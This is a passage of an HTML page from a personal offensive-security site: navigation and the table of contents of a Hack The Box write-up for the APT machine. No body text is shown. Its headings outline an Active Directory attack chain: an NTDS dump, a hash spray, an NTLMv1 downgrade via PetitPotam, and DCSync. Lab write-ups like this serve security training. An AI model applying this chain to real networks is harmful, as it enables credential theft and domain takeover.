@@ -1,0 +1,2403 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Personal cyber security research, CTF write-ups, and vulnerability disclosures by Jose Raul Bongiovani.">
+      
+      
+        <meta name="author" content="Jose Raul Bongiovani">
+      
+      
+        <link rel="canonical" href="https://b0nyo.github.io/writeups/hack-the-box/machines/insane/apt/APT/">
+      
+      
+        <link rel="prev" href="../../">
+      
+      
+        <link rel="next" href="../../../../../../cves/">
+      
+      
+      <link rel="icon" href="../../../../../../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>APT - b0nyo // Offensive Security</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#apt-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../../.." title="b0nyo // Offensive Security" class="md-header__button md-logo" aria-label="b0nyo // Offensive Security" data-md-component="logo">
+      
+  <img src="../../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            b0nyo // Offensive Security
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              APT
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../../cves/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CVEs
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About & Contact
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../.." title="b0nyo // Offensive Security" class="md-nav__button md-logo" aria-label="b0nyo // Offensive Security" data-md-component="logo">
+      
+  <img src="../../../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    b0nyo // Offensive Security
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Write-ups
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Write-ups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Hack The Box
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Hack The Box
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../challenges/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Challenges
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../challenges/web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../challenges/pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../challenges/crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Crypto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../challenges/forensics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forensics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../challenges/reversing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reversing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Machines
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../easy/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Easy
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_3_2" id="__nav_2_2_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../easy/bashed/Bashed-WriteUp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bashed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../easy/nibbles/Nibbles-WriteUp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nibbles
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../easy/timelapse/Time-Lapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TimeLapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../medium/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Medium
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_3_3" id="__nav_2_2_3_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Medium
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../medium/delegate/Delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Delegate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../medium/popcorn/Popcorn-WriteUp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Popcorn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../hard/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Hard
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_3_4" id="__nav_2_2_3_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            Hard
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../hard/redelegate/Redelegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Redelegate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Insane
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2_3_5" id="__nav_2_2_3_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            Insane
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    APT
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    APT
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scanning
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Port Scanning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#discovering-ipv6-via-dcom-ioxidresolver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovering IPv6 via DCOM / IOXIDResolver
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Discovering IPv6 via DCOM / IOXIDResolver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-doesnt-it-appear-in-rpcdump" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why doesn't it appear in rpcdump?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-the-attack-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      How the attack works
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-port-scan-via-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full Port Scan via IPv6
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Full Port Scan via IPv6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration-over-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration over IPv6
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration-anonymous-share-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Enumeration — Anonymous Share Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-the-backup-zip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracking the Backup ZIP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#offline-ntds-dump-with-secretsdumppy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Offline NTDS Dump with secretsdump.py
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-validation-via-kerbrute" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Validation via Kerbrute
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm-hash-spray-against-henryvinson" class="md-nav__link">
+    <span class="md-ellipsis">
+      NTLM Hash Spray Against henry.vinson
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry-access-with-regpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Registry Access with reg.py
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-henryvinson_adm-and-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as henry.vinson_adm and user Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-ntlmv1-downgrade-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation — NTLMv1 Downgrade Attack
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation — NTLMv1 Downgrade Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-the-attack-path-via-powershell-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding the Attack Path via PowerShell History
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Finding the Attack Path via PowerShell History">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-does-this-matter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why does this matter?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-configure-responder-with-a-fixed-challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1 — Configure Responder with a Fixed Challenge
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-force-authentication-with-petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2 — Force Authentication with PetitPotam
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-crack-with-rainbow-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3 — Crack with Rainbow Tables
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync-as-apt-administrator-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCSync as APT$ — Administrator Hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-administrator-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as Administrator — Root Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../cves/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CVEs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    About & Contact
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scanning
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Port Scanning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#discovering-ipv6-via-dcom-ioxidresolver" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovering IPv6 via DCOM / IOXIDResolver
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Discovering IPv6 via DCOM / IOXIDResolver">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-doesnt-it-appear-in-rpcdump" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why doesn't it appear in rpcdump?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-the-attack-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      How the attack works
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-port-scan-via-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Full Port Scan via IPv6
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Full Port Scan via IPv6">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration-over-ipv6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Service Enumeration over IPv6
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration-anonymous-share-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Enumeration — Anonymous Share Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-the-backup-zip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracking the Backup ZIP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#offline-ntds-dump-with-secretsdumppy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Offline NTDS Dump with secretsdump.py
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-validation-via-kerbrute" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Validation via Kerbrute
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm-hash-spray-against-henryvinson" class="md-nav__link">
+    <span class="md-ellipsis">
+      NTLM Hash Spray Against henry.vinson
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry-access-with-regpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Registry Access with reg.py
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-henryvinson_adm-and-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as henry.vinson_adm and user Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
